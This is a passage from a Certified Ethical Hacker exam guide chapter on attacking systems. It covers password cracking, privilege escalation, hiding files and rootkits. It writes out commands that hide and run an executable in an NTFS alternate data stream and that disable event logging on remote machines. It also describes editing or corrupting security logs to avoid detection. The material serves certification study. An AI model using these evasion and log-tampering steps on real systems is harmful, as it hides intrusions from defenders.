the session, and applied an Ettercap filter to pull out gzip compression, and the encoded
strings were there for the taking. The only indication anything was out of sorts on the
user’s side? A quick warning banner that the certificate needed looking at, which most
people will click past without even thinking about it.

ScoopLM has a built-in password cracker and specifically looks for Windows authen-
tication traffic on the wire to pull passwords from. KerbCrack also has a built-in sniffer
and password cracker, specifically looking for port 88 Kerberos traffic.

NOTE In addition to the inormation here and all the notes and such
accompanying this book, don’t ignore the resources available to you on the
Internet. Do a ew searches or videos on “sniing passwords” and any, or all,
o the tools mentioned. And don’t discount the websites providing these
tools—you can usually ind orums with stories and help.

Offline Attacks Offline attacks occur when the hacker steals a copy of the password file
(remember our discussion on the SAM file earlier?) and works the cracking efforts on a
separate system. These attacks may require some form of physical access to the machine

05-ch05.indd 213 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

214

(not as hard as you’d like to believe in a lot of cases—trust me) where the attacker pulls
the password file to removable media and then sneaks off to crack passwords at his lei-
sure, but the point is you steal the hashes and take them somewhere else to bang on.

NOTE Beating your head against the wall to steal/crack passwords in
Windows may be pointless in the long run. Skip Duckwall and Chris
Campbell’s presentation at Black Hat in 2012 on “passing the hash” (https://
www.youtube.com/watch?v=O7WRojkYR00 ) points out some serious
ailures in security regarding password hashes and system privileges in
Microsot Windows.

Password cracking offline can be done in one of three main ways: dictionary attack,
hybrid attack, and brute-force attack. A dictionary attack is the easiest and by far the
fastest attack available. This attack uses a list of passwords in a text file, which is then
hashed by the same algorithm/process the original password was put through. The hashes
are compared, and if a match is found, the password is cracked. Technically speaking,
dictionary attacks are supposed to work only on words you’d find in a dictionary. They
can work just as well on “complex” passwords too; however, the word list you use must
have the exact match in it. You can’t get close; it must be exact. You can create your own
dictionary file or simply download any of the thousands available on the Internet.

A hybrid attack is a step above the dictionary attack. In the hybrid attack, the crack-
ing tool is smart enough to take words from a list and substitute numbers and symbols
for alpha characters—perhaps a zero for an O, an @ for an a. Hybrid attacks may also
append numbers and symbols to the end of dictionary file passwords. Bet you’ve never
simply added a “1234” to the end of a password before, huh? By doing so, you stand a
better chance of cracking passwords in a complex environment.

EXAM TIP ECC absolutely loves rainbow tables. A rainbow table is a huge
compilation o hashes o every password imaginable. This way, the attacker
simply needs to compare a stolen hash to a table and—ta-dah!—cracked.
The amount o time it takes a cracker to work is dramatically decreased
by not having to generate all these hashes over and over again. In the real
world, GPU systems can brute-orce passwords in a manner o minutes or
hours, so rainbow tables aren’t really all that valuable. I you wish to make
one, though, you can use tools such as rtgen and Winrtgen.

The last type of offline password cracking is called a brute-force attack, and it’s exactly
what it sounds like. In a brute-force attack, every conceivable combination of letters,
numbers, and special characters is compared against the hash to determine a match.
Obviously, this is very time consuming, chewing up a lot of computation cycles and
making this the longest of the three methods. However, it is your best option on complex
passwords, and there is no arguing its effectiveness. Given enough time, every password
can be cracked using brute force. Granted, we could be talking about years here—maybe
even hundreds of years—but it’s always 100 percent effective over time.

05-ch05.indd 214 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

215

If you cut down the number of characters the cracker has to work with and reduce the
number of variations available, you can dramatically reduce that time span. For example,
if you’re in a network and you know the minimum password length is eight characters,
then there’s no point in having your cracker go through all the variations of seven char-
acters or less. Additionally, if you have a pretty good idea the user doesn’t like all special
characters and prefers to stick with the “Fab Four” (!, @, #, and $), there’s no sense in
having your cracker try combinations that include characters such as &, *, and (.

For example—and to stick with a tool we’ve already been talking about—Cain is
fairly good at cracking Windows passwords, given enough time and processing cycles.
For this demonstration, I created a local account on my system and gave it a (pur-
posefully) short, four-character password: P@s5. Firing up Cain, I clicked the Cracker
menu choice, clicked the LM&NTLM Hashes option on the left, and then clicked the
big blue plus sign (+) at the top. Once all my accounts and associated passwords were
dumped (simulating a hacker who had snuck in and taken them without my knowl-
edge), I clicked my new user, cut down the number of possible characters for Cain to try
(instead of all alphanumeric and special characters, I cut it down to ten, simply to speed
up the process), and started the cracking. Forty-six minutes later, almost on the button,
the password was cracked.

EXAM TIP Another password cracker to ile away in memory is THC Hydra.
It’s capable o cracking passwords rom a variety o protocols using a
dictionary attack.

Of course, multiple tools are available for password cracking. Cain, KerbCrack, and
Legion have already been mentioned. Another is John the Ripper—one of the more
“famous” tools available. John is a Linux tool that can crack Unix, Windows NT, and
Kerberos passwords. You can also download some add-ons that allow John to crack other
passwords types (MySQL, for instance). Regardless of the tool, remember that dictionary
attacks are fastest and that brute force takes the longest.

NOTE While cracking passwords is all neat and un, don’t orget a deault
password on a box may very well be your ticket in. The person installing
an app, service, or piece o hardware may just might orget to change
the deault password assigned during install, leaving you a nice, easy
pathway in. Some resources or this include OpenSezMe (https://open-sez
.me/), CIRT (https://cirt.net), and several “deaultpassword” sites (https://
deaultpassword.us, deaultpasswords.in, and deaultpassword.com).

And finally, as with many other aspects of this (and every other certification exam
on the planet), there are certain definition terms and names regarding specific password
attacks you’ll simply need to commit to memory. For example, a Toggle Case attack
occurs when an attacker attempts all upper- and lowercase combinations of a word in
the input dictionary. A Combinator attack is one where the bad guy combines two dic-
tionary list entries to generate a new wordlist for password cracking, whereas the Prince

05-ch05.indd 215 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

216

attack is closely related but uses a single dictionary to build word combination chains. A
couple others include the Fingerprint attack (passphrases are broken down to identifiable
fingerprints of single- or multiple-character combinations that are then used to crack
others) and the Markov-Chain attack (passphrases are split into two- to three-character
groups and then used to create, in effect, a new alphabet). These may or may not be use-
ful to you out in the real world, but for the sake of your certification exam, just memorize
them and move on.

Privilege Escalation and Executing Applications
The only real problem with user IDs and password hacking is that, once you crack one,
you’re stuck with the privilege level of the user. Of course, if you can get done what you
need without bothering to escalate privileges, go for it. Sometimes, though, you just need
more. If the user account is not an administrator or doesn’t have access to interesting
shares, then you may not be much better off than you were before, and if you are so noisy
in your attack that it garners too much attention, it won’t do you much good anyway. In
this section, we’ll go over some of the basics on escalating your current privilege level to
something a little more fun, as well as some methods you can apply to keep your hacking
efforts a little quieter.

Privilege Escalation
Unfortunately, escalating the privilege of an account you’ve hacked isn’t an easy thing to
do—unless the system you’re on isn’t fully patched. Quite obviously, operating systems
put in various roadblocks to prevent you from doing so. However, as you’ve no doubt
noticed, operating systems aren’t released with 100 percent of all security holes plugged.
Rather, it’s quite the opposite, and security patches are released with frequency to address
holes, bugs, and flaws discovered “in the wild.” In just one week during the writing of
this chapter alone, Microsoft released 24 patches addressing a wide variety of issues—
some of which involved the escalation of privileges.

EXAM TIP There are two types o privilege escalation. Vertical privilege
escalation occurs when a lower-level user executes code at a higher privilege
level than they should have access to. Horizontal privilege escalation isn’t
really escalation at all but rather simply executing code at the same user
level but rom a location that should be protected rom access.

Basically you have four real hopes for obtaining administrator (root) privileges on a
machine. The first is to crack the password of an administrator or root account, which
should be your primary aim (at least as far as the CEH exam is concerned) and makes the
rest of this section moot. The second is to take advantage of a vulnerability found in the
OS, or in an application, that will allow you access as a privileged user. If you were pay-
ing attention about the importance of looking into vulnerability websites, this is where it
pays off. In addition to running vulnerability scanners (such as Nessus) to find holes, you
should be well aware of what to already look for before the scanner gets the results to you.

05-ch05.indd 216 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

217

NOTE Cracking a password in the real world o penetration testing isn’t
really the point at all. Getting access to the data or services, or achieving
whatever generic goal you have, is the point. I this goal involves having
administrative privileges, so be it. I not, don’t sit there hammering away at
an admin password because you believe it to be the Holy Grail. Get what you
came or and get out, as quickly and stealthily as you can.

For example, in December 2009, both Java and Adobe had some serious flaws in
their applications that allowed attackers to run code at a privileged level. This informa-
tion spread quickly and resulted in hacking and DoS attacks rising rather significantly
until the fix actions came out. Once again, you’re not attempting to do something
magic or overly technically complicated here; you’re just taking advantage of unpatched
security flaws in the system. The goal is to run code—whatever code you choose—at
whatever level is necessary to accomplish your intent. Sometimes this means running
at an administrative level regardless of your current user level, which requires escalation
and a little bit of noisiness, and sometimes it doesn’t. Again, in the real world, don’t lose
sight of the end goal in an effort to accomplish something you read in a book.

EXAM TIP DLL hijacking can prove very useul in privilege escalation. Many
Windows applications don’t bother with a ull path when loading external
DLLs. I you can somehow replace DLLs in the same application directory
with your own malicious versions, you might be in business. And i you’re
on a Mac, nearly the same principle applies—except you’ll be dealing with
DYLIB hijacking instead.

The third method is to use a tool that (ideally) provides you the access you’re looking
for. One such tool, Metasploit, is an entire hacking suite in one and a great exploit-testing
tool (in other words, it’s about a heck of a lot more than privilege escalation and will be
discussed more as this book continues). You basically enter the IP address and port num-
ber of the target you’re aiming at, choose an exploit, and add a payload—Metasploit does
the rest. The web front end is probably easier to use (see Figure 5-6), but some purists
will tell you it’s always command line or nothing.

Metasploit has a free version, Metasploit Framework, and a pay-for version, known
as Metasploit Pro. The framework you can download for free works perfectly well, but
the Pro version, although expensive, is simply unbelievable. To say Metasploit is an
important player in the pen testing/hacking realm is akin to saying Mount Everest is
“kind of ” tall. It’s a powerful pen testing suite that warrants more attention than I have
room for in this book. Visit the website (https://www.metasploit.com) and learn more
about this opportunity for yourself. There are tons of help pages, communities, a blog
board, and more, to provide assistance. Trust me—you’ll need them.

NOTE Does a $15,000 per year GUI ront end or using Metasploit seem a
little on the ridiculous side to you? Same here. That’s why I’m recommending
you check out Armitage (http://astandeasyhacking.com/). It’s a GUI ront
end or Metasploit that is, in a word, awesome. And did I mention it’s ree?

05-ch05.indd 217 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

218

Figure 5-6 Metasploit’s main window

Finally, the last method available may actually seem like cheating to you because it’s so
ridiculously easy you might not have even thought about it. What if you just asked the
current user to run an application for you? Then you don’t need to bother with hacking
and all that pesky technology at all. This type of social engineering will be discussed in
greater detail in Chapter 7, but it’s undeniably productive. You can simply put executable
code in an e-mail and ask the user to click it—more often than not, they will! Craft a file
to take advantage of a known Microsoft Office macro on an unpatched system and send
it to them; most of the time they’ll click and open it! This is by far the easiest method
available and probably will wind up being your most effective technique over time.

Executing Applications
So, you’ve figured out how to gain access to the system and maybe even found a way to
escalate your privileges to that of administrator (root-level) status. Now what? Do you
check that box and move on to the next target, or is there something more? It would be
fairly deflating to come this far, touch the ring, and just leave, so I vote you stay and get
some more work done.

Many times the act of escalating privileges requires you to execute an application or
some sort of code, so this whole thing may seem a bit silly. However, just as I’ve stressed
regarding all these methodologies and steps to this point, simply chalk this up to ensur-
ing you get everything covered before the plane takes off appropriately, and read on.

Speaking of silly, EC-Council refers to this step as “owning” a system. Apparently
gaining access to the machine and escalating your privileges to that of root level doesn’t
mean anything at all. But remotely executing applications on the target machine?
Now you’re really hacking—ethically, of course. The step of executing applications

05-ch05.indd 218 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

219

includes pretty much everything you can think of, hacking-wise. Obviously it applies
to “malicious” programming—starting tools such as keyloggers, spyware, back doors,
and crackers—but the idea is the same regardless: once you have access to the system,
execute at or above your privilege level to accomplish what you need to do.

I hesitate to add any more here, because oftentimes the application you’re executing is
designed to ensure your continued access to the machine (which is a separate step alto-
gether), so I’ll purposefully keep this section short. However, it is important to remember
that the act of gaining root privilege and access isn’t really as important as getting the
machine to do your bidding in the first place. New pen testers who come out of training
often get caught up in the step-by-step process, instead of concentrating on what they’re
really there to do, and their work suffers. As an ethical hacker, your goal is success—no
matter how it comes. If the machine is doing what you want it to do, who cares about
your root privilege level (or lack thereof )?

One thing we can do to wrap up is talk about a couple tools that may assist in executing
on a remote machine and that you may see pop up on the exam. The tools in this phase
are designed to deliver and execute applications within a network to remote systems. The
idea is for administrators to have an easy way to deploy software and patches to machines
under their control and care. There are hundreds and hundreds of these tools designed to
make life easier on administrators that can be turned and used for dubious purposes. Exam-
ples of these include RemoteExec (https://www.isdecisions.com), PDQ Deploy (https://
www.adminarsenal.com), and Dameware Remote Support (https://www.dameware.com).
Regardless of the application, the idea is the same—remotely execute code on a machine,
or several machines, to get something accomplished.

Hiding Files and Covering Tracks
So, you’ve spent time examining potential targets, mapping out open ports, scanning for
vulnerabilities, and prepping for an attack. After a few tries you’ve successfully stolen a
password and now find yourself sitting on the machine, logged on, and ready to go. Before
you actually start executing anything, you need to be aware of all the attention that will
be focused on your actions. Is the security administrator on the ball? Does she actively
monitor the event logs on a regular basis? Is there a host-based intrusion detection system
(HIDS) on the machine? How can you get information from it quietly and unnoticed?

This is where the ethical hacker, the guy working a pen test to help a customer see
security flaws in their system, is at a huge disadvantage compared to his bad-guy coun-
terpart in the real world. Stealth in hacking truly comes down to patience. Spend enough
time, move slowly enough, and chances are better than not you’ll go unnoticed. Lose
patience and try to upload every groovy file you see on the machine, and you’ll quickly
find yourself firewalled off and trapped. The true bad guys out there have time on their
side and can take months to plan and pull off an attack. The pen tester has, by design, a
limited amount of time to pull it all off.

But don’t lose heart. There are a few ways you can still sneak around and hide where
you’ve been and what you’ve been up to. Some of it we’ve already talked about (such as
evading network IDS by fragmenting packets and such), but there is also stealth to be
had in hiding files and covering your tracks on the system. And that’s what we’ll cover
in this section.

05-ch05.indd 219 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

220

Hiding Files and Covering Tracks
While it’s definitely more in the realm of academics and book knowledge, one way to
hide files on Windows machines is through the use of an alternate data stream (ADS)
in the form of New Technology File System (NTFS) file streaming. ADS is a feature of
the Windows-native NTFS to ensure compatibility with Apple file systems (called HFS),
not to mention the ability for loads of back-end features built into the OS and applica-
tions. ADS has been around ever since the Windows NT days and has held on all the
way through to current Windows releases. NTFS streaming still works on all Windows
versions, up through and including 10, believe it or not. No one in practice actually uses
NTFS streaming, because it’s easy to spot and triggers all sorts of blasting warnings, but
you will need to know it for your exam.

Rockwell TVs
Remember back when TV buying was simple? You could just walk into a store, look
at the screens, and pick the one that seemed best. Now there are all sorts of options
to consider: 3D technology, curved screens, 4K...the features seem endless. And,
of course, every TV nowadays needs to be “smart.” After all, we should be able to
stream Netflix, Amazon Prime, and Hulu without hooking up another box.

One such “smart” innovation is Samsung’s voice recognition feature. It’s actually
pretty neat—once it’s set up, you can just say what you want and the TV will do it.
Want to mute the TV volume quickly without searching for the perfect button on
the remote? Just say “Mute sound.” Can’t find the remote and want to change the
channel real quick because insert-family-member-here just walked into the room?
“Channel up” will take care of you. And if you’re bored and have seen every rerun
that’s playing, just yell “Smart Hub” and tell it which streaming service you want to
start. Neat, huh? Well, except for one little thing.

See, for the TV to be ready to interpret what you say at any moment as a com-
mand to run, it has to listen all the time—which means if someone, anyone (say,
even a giant, faceless corporation) wanted to listen in on your conversations, maybe
even tape a few here and there...well, it’s almost as good as planting a bug in the
room, now isn’t it? According to CNN, that’s exactly what’s going on (https://www
.cnn.com/2015/02/11/opinion/schneier-samsung-tv-listening/, https://money.cnn
.com/2015/02/09/technology/security/samsung-smart-tv-privacy/).

Per CNN’s reporting, it seems “what you say isn’t just processed by the television;
it may be forwarded over the Internet for remote processing. It’s literally Orwellian.”
I’m sure we’re all aware the cameras and microphones on our smartphones can (and
have been) hacked for all kinds of monitoring overlord practices (and if you’re not
aware, you really need to read more). As an example, maybe you’re aware Facebook
has the ability to turn your smartphone’s microphone on when you’re using the app.
And I’m positive you’re all aware Gmail and other communication applications
“listen” to everything you write—which explains why you’re seeing battery adver-
tisements after e-mailing about all those controllers for your video games.

05-ch05.indd 220 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

221

But the concept of my TV listening to everything I say? Shouldn’t I have an expec-
tation of privacy in my own living room? Forget those private conversations that would
embarrass any of us if they were broadcast for the world, what if you said something
in private that could be taken the wrong way? Maybe, say, by law enforcement? Heck,
any recording made of me during an Alabama Crimson Tide game would probably
include at least one snippet that would get me put on some watch list somewhere.

Per CNN’s report, Samsung promises that the data was used for nothing more
than tuning efforts, and it was all erased immediately. While we’re all winking and
saying “yeah sure,” what’s really concerning is most of the other companies that are
listening promise no such thing and, in fact, save your data for a long time. Should
you be concerned? Of course you should. Then again, we’ve always been worried
about new technology. In 1878, the New York Times accused Thomas Edison of
destroying communication between mankind because of his “aerophone” allow-
ing people to record voice. “This machine will eventually destroy all confidence
between man and man, and will render more dangerous than ever woman’s want of
confidence in woman.” It’s almost as if new technology is always scary.

And if you’re among the folks that have added Amazon devices to your home,
there’s a whole new level of Orwellian fun to look forward to. Ever hear of Amazon
Sidewalk? It’s a new effort to make things easier and simpler for you, the user. Noth-
ing to see here, though; it just makes your Amazon devices jump onto your neigh-
bor’s wireless network to stay up and active if your network has any issues at all.

New tech or no, the encroachment into privacy is an ever-growing concern. If
not already, your TV will soon be equipped with a camera—imagine the horrors
that could record. Rockwell sang in the 80s, “Sometimes I feel like somebody’s
watching me.” I don’t feel like it, I know.

NTFS file streaming allows you to hide virtually any file behind any other file, render-
ing it invisible to directory searches. The file can be a text file, to remind you of steps to
take when you return to the target, or even an executable file you can run at your leisure
later. The procedure is simple. Suppose you want to put the executable badfile.exe in a
plain-old readme.txt file. First, move the contents of the badfile file into the text file with
a command like this: c:\type c:\badfile.exe > c:\readme.txt:badfile.exe. Then just put
readme.txt wherever you’d like and wait until it’s time to put it to use. When ready to use
the file, simply type start readme.txt:badfile.exe. If you really want to get fancy, create
a link to the bad file by typing c:\mklink innocent.exe readme.txt:badfile.exe and you
can just execute innocent.exe anytime you want.

NOTE It’s noteworthy to point out here that every orensics kit on Earth
checks or ADS at this point. Additionally, in modern versions o Windows,
an executable that’s run inside a .txt ile, or instance, shows up in the Task
Manager as part o the parent. EC-Council writes this generically or the
exam, and I’ve tried to stay true to that; however, sometimes reality and the
test collide so awkwardly I simply can’t stay silent about it.

05-ch05.indd 221 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

222

If you’re a concerned security professional wondering how to protect against this
insidious built-in Windows “feature,” relax—all is not lost. Several applications, such as
LNS and Sfind, are created specifically to hunt down ADS. Additionally, Windows Vista
introduced a handy little addition to the directory command (dir /r) that displays all file
streams in the directory. Lastly, copying files to and from a FAT partition blows away any
residual file streams in the directory.

NOTE Want another weird method to hide things, and in a location that
hardly anyone thinks to look at? How about the registry itsel? Adding
items to the registry is really easy, and there are tons o places most people
won’t even bother to go. It can be tricky i what you’re hiding is too bulky or
whatnot, but it does work!

Although it’s not 100 percent certain to work, because almost everyone knows to look
for it, I can’t neglect to bring up the attributes of the files themselves and how they can
be used to disguise their location. One of these attributes—hidden—does not display the
file during file searches or folder browsing (unless the administrator changes the view to
force all hidden files to show). In Windows, you can hide a file by right-clicking, choos-
ing Properties, and checking the Hidden check box in the Attributes field. Of course, to
satisfy you command-line junkies who hate the very thought of using anything GUI, you
can also do this by issuing the attrib command:

attrib +h filename

Another file-hiding technique we’ll hit on later in the book (when I start talking
encryption and cryptography) is steganography. Sure, we could discuss encryption as a
hiding technique here as well, but encrypting a file still leaves it visible; steganography
hides it in plain sight. For example, if you’ve gained access to a machine and you want
to ferret out sensitive data files, wouldn’t it be a great idea to hide them in JPG files of
the basketball game and e-mail them to your buddy? Anyone monitoring the line would
see nothing but a friendly sports conversation. Tools for hiding files of all sorts in regu-
lar image files or other files include Hide’N’Send, SteganPEG, OpenStego, Our Secret,
Steghide, and Xiao.

EXAM TIP Another term used in regard to steganography is semagram, and
there are two types. A visual semagram uses an everyday object to convey
a message. Examples can include doodling as well as the way items are laid
out on a desk. A text semagram obscures a message in text by using things
such as ont, size, type, or spacing.

In addition to hiding files for further manipulation/use on the machine, covering your
tracks while stomping around in someone else’s virtual play yard is also a cornerstone of
success. The first thing that normally comes to mind for any hacker is the ever-present
event log, and when it comes to Windows systems, there are a few details you should

05-ch05.indd 222 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

223

know up front. You’ll need to comb over three main logs to cover your tracks—the appli-
cation, system, and security logs.

The application log holds entries specifically related to the applications, and only
entries programmed by the developers get in. For example, if an application tries to
access a file and the file has been corrupted or moved, the developer may have an error
logged to mark that. The system log registers system events, such as drivers failing and
startup/shutdown times. The security log records the juicy stuff, such as login attempts,
access and activities regarding resources, and so on. To edit auditing (the security log
won’t record a thing unless you tell it to), you must have administrative privileges on the
machine. Depending on what you’re trying to do to the machine, one or all of these may
need scrubbing. The security log, obviously, will be of primary concern, but don’t neglect
your tracks in the others.

Many times a new hacker will simply attempt to delete the log altogether. This, how-
ever, does little to cover his tracks. As a matter of fact, it usually sends a giant blaring
signal to anyone monitoring log files that someone is messing around on the system.
Why? Because anyone monitoring an event log will tell you it is never empty. If they’re
looking at it scrolling by the day before your attack and then come back the next day and
see only ten entries, someone is going into panic mode.

A far better plan is to take your time (a familiar refrain is building around this, can’t
you see?) and be selective in your event log editing. Some people will automatically go
for the jugular and turn auditing off altogether, run their activities, and then turn it
back on. Sure, their efforts won’t be logged in the first place, but isn’t a giant hole in the
log just as big an indicator as error events themselves? Why not go in, first, and just edit
what is actually being audited? If possible, turn off auditing only on the items you’ll be
hitting—such as failed resource access, failed logins, and so on. Then, visit the log and
get rid of those items noting your presence and activities. And don’t forget to get rid of
the security event log showing where you edited the audit log.

NOTE Another tip or hiding tracks in regard to log iles is to not even bother
trying to hide your eorts but rather simply corrupt the log ile ater you’re
done. Files corrupt all the time, and, oten, a security manager may not even
bother to try to rebuild a corrupted version—assuming “stu happens.” The
answer in hacker-land is to always do what gives the highest probability o
success and non-detection, while minimizing eort and resources.

One last note on log files and, I promise, I’ll stop talking about them: Did you know
security administrators can move the default location of the log files? By default, every-
one knows to look in %systemroot%\System32\Config to find the logs; each has an .evt
extension. However, updating the individual file entries in the appropriate registry key
(HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog) allows
you to place them wherever you’d like. If you’ve gained access to a system and the logs
aren’t where they’re supposed to be, you can bet you’re in for a tough day; the security
admin may already have eyes on you.

05-ch05.indd 223 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

224

Figure 5-7 Windows audit policy

A few tools are available for taking care of event log issues. In Control Panel | Admin-
istrative Tools | Local Security Policy, you can set up and change the audit policy for
the system. The top-level settings are found under Local Policies | Audit Policy. Other
settings of note are found in Advanced Audit Policy Configuration at the bottom of the
listings under Security Settings. Other tools of note include elsave, WinZapper, and
Evidence Eliminator. Lastly, Auditpol (shown in Figure 5-7) is a tool included in the
old Windows NT Resource Kit that may be useful on older systems. You can use it to
disable event logs on other machines. The following should do the trick:

c:\auditpol \\targetIPaddress /disable

Rootkits
Finally, no discussion on system hacking and maintaining stealth/access on the machine
can be complete without bringing up rootkits. Per ECC, a rootkit is a collection of soft-
ware put in place by an attacker that is designed to obscure system compromise. In
practice, a rootkit is software that replaces or substitutes administrator utilities and capa-
bilities with modified versions that obscure or hide malicious activity. In other words,
if a system has a properly introduced rootkit installed, the user and security monitors
shouldn’t even know anything is wrong—at least until it’s too late to do anything about
it. Rootkits are designed to provide back doors for the attacker to use later and include
measures to remove and hide evidence of any activity.

There are, of course, as many rootkits names and types as you can conceivably come
up with; however, some are more notable for us because EC-Council references them for
your memorization. One such item is “Horsepill,” a Linux kernel rootkit inside “initrd”

05-ch05.indd 224 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

225

with three main parts: klibc-horsepill.patch (creates a new, malicious, run-init), horsepill_
setopt (moves command-line arguments to the preceding), and hrsepill_infect (splats
files). Another is “Grayfish,” a Windows rootkit that injects code in the boot record, cre-
ating its own virtual file system (VFS). Sirefef is also mentioned, but its definition lends
more to malware on steroids: it’s defined as a “multi-component family of malware.” Oth-
ers you may see referenced include Azazel, Avatar, Necurs, and ZeroAccess.

EXAM TIP Two rootkits o note are LoJax and Scranos. LoJax automatically
executes when the system starts up and exploits a malicious UEIF (Uniied
Extensible Firmware Interace). Scranos is a continuously evolving rootkit
aimed at stealing passwords, inancial inormation, and other sensitive data
rom home users and organizations across the globe (its main targets are,
not surprisingly, Chrome, Opera, Internet Explorer, and applications like
Facebook, Amazon, or YouTube).

Per the CEH objectives, there are six types of rootkits:

• Hypervisor level These rootkits modify the boot sequence of a host system to
load a virtual machine as the host OS.

• Hardware (firmware) These rootkits hide in hardware devices or firmware.
• Boot loader level These rootkits replace the boot loader with one controlled

by the hacker.
• Application level As the name implies, these rootkits are directed to replace

valid application files with Trojan binaries. These kits work inside an application
and can use an assortment of means to change the application’s behavior, user
rights level, and actions.

• Kernel level These rootkits attack the boot sectors and kernel level of the
operating systems themselves, replacing kernel code with back-door code. These
rootkits are by far the most dangerous and are difficult to detect and remove.

• Library level These rootkits basically use system-level calls to hide their existence.

NOTE Rootkits are exponentially more complicated than your typical
malware application and relect signiicant sophistication. I your company
detects a customized rootkit and thinks it was targeted, it’s time to get
the FBI involved. And to really scare the wits out o you, check out what a
truly sophisticated rootkit can do: https://en.wikipedia.org/wiki/Blue_Pill_
(sotware).

In the real world, rootkits are discussed much more in the context of the ring in which
they work. The term protection rings in computer science refers to concentric, hierarchi-
cal rings from the kernel out to the applications, each with its own fault tolerance and
security requirements. The kernel is referred to as Ring 0, while drivers (Ring 1), libraries

05-ch05.indd 225 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

226

(Ring 2), and applications (Ring 3, also known as user mode) make up the surrounding
rings. Although you probably won’t see them listed as such on your exam (yet, at least in
the current version), it’s helpful to think of kernel rootkits working at Ring 0, application
rootkits at Ring 3, and so on.

EXAM TIP ECC provides a neat little section on “Steps or Detecting Rootkits.”
By their own admission, this results in a lot o alse positives and does not
detect all stealth sotware (in BIOS, EEPROM, or hidden in data streams and
such), but it’s worth noting in case you see it on your exam. First, run the
dir /s /b /ah command and the dir /s /b /a-h command in the potentially
inected operating system and save the results. Next, boot a clean CD version
and run the same commands or the same drive again. Last, use WinDi
(https://support.microsot.com/en-us/kb/159214) on both results to see any
hidden malware.

So how do you detect rootkits and what can you do about them? Well, you can certainly
run integrity verifiers, and there are some heuristic-, signature-, and cross-view–based
detection efforts that can show you whether a rootkit is in place. But the big question is,
once you know, what do you do about it? While there are lots of things suggested, both in
and out of official courseware, the real answer as far as your exam is concerned is to just
reload the system. Use quality, trusted backups and reload. Unless it’s a BIOS rootkit. Or
something on the firmware on your disk controller. Then…well…all bets are off.

Chapter Review
Microsoft Windows stores authentication credentials—hashes of passwords—in the
SAM file, located in the C:\Windows\System32\Config folder. The biggest cause of con-
cern for this method of password storage (and with hashing in general) is the complex-
ity of the hash algorithm used. Windows 2000 and Windows NT–type machines used
something called LAN Manager, and then NT LAN Manager, to hash passwords. LM
hashing puts all passwords in 14 characters, split into two 7-character groupings, and
hashes both sides to make a full hash. If this process leaves the second seven-character
side empty (that is, the original password was seven characters or less), the second half
of the hash will always appear as AAD3B435B51404EE. In Windows Vista and later,
the LM hash is shown as blank (the NO PASSWORD entries in the SAM file), and the
NTLM hash appears second.

Even after the password has been obtained, though, the addition of salting (addi-
tional protection by adding random data as additional input before being hashed) and
the use of better methods for authentication (NTLMv2 and Kerberos, if you sniff the
hash value) make life for a password cracker pretty tough. The Windows default authen-
tication protocol/method is Kerberos. Kerberos makes use of both symmetric and asym-
metric encryption technologies to securely transmit passwords and keys across a network.
The entire process is made up of a Key Distribution Center (KDC), an Authentication
Service (AS), a Ticket Granting Service (TGS), and the Ticket Granting Ticket (TGT).

05-ch05.indd 226 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

227

A basic Kerberos exchange follows a few easy but secure steps. The client first asks
the KDC (which holds the AS and TGS) for a ticket, which will be used to authenticate
throughout the network. This request is in clear text. The server responds with a secret
key, which is hashed by the password copy kept on the server (in Active Directory). This
is known as the TGT. If the client can decrypt the message (and it should since it knows
the password), the TGT is sent back to the server requesting a TGS service ticket. The
server responds with the service ticket, and the client is allowed to log on and access
network resources. Once again, the password itself is never sent. Instead, a hash value of
the password, encrypted with a secret key known only by both parties and good only for
that session, is all that’s sent.

The Windows registry is a collection of all the settings and configurations that make the
system run. Hierarchical in nature, it stores a variety of configuration settings and options.
In it, you can find settings for low-level operating system components, applications run-
ning on the machine, drivers, the SAM file, and the user interface. Two basic elements
make up a registry setting: keys and values. A key can be thought of as a location pointer
(much like a folder in the regular file structure), and the value of that key defines the
setting. Keys are arranged in a hierarchy, with root keys at the top, leading downward to
more specific settings. The root-level keys in the registry are HKEY_LOCAL_MACHINE
(HKLM), HKEY_CLASSES_ROOT (HKCR), HKEY_CURRENT_USER (HKCU),
HKEY_USERS (HKU), and HKEY_CURRENT_CONFIG (HKCC).

Key values can be a character string (REG_SZ), an “expandable” string value
